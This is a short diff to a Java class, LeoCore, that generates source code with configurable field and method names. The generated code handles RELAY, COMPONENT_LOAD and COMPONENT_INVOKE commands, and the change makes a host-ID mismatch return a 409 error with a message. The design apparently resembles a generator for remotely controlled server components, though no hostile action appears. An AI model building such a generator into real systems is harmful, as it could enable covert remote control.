@@ -180,7 +180,10 @@ public class LeoCore {
                                                "        else if (\"RELAY\".equals(var1)) this." + config.getMethodRedirect() + "(var7);\n" +
                                                "        else if ((\"COMPONENT_LOAD\".equals(var1) || \"COMPONENT_INVOKE\".equals(var1))\n" +
                                                "                && !" + config.getFieldHostId() + ".equals(var7.get(\"hostId\"))) {\n" +
-                                               "            this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(403));\n" +
+                                               "            this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(409));\n" +
+                                               "            this." + config.getFieldResults() + ".put(\"errorCode\", \"HOST_ID_MISMATCH\");\n" +
+                                               "            this." + config.getFieldResults() + ".put(\"hostId\", " + config.getFieldHostId() + ");\n" +
+                                               "            this." + config.getFieldResults() + ".put(\"msg\", \"HostId does not match the current runtime instance\");\n" +
                                                "        } else if (\"COMPONENT_LOAD\".equals(var1)) this." + config.getMethodLoadComponent() + "();\n" +
                                                "        else if (\"COMPONENT_INVOKE\".equals(var1)) this." + config.getMethodInvokeComponent() + "();\n" +
                                                "        else this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(404));\n" +
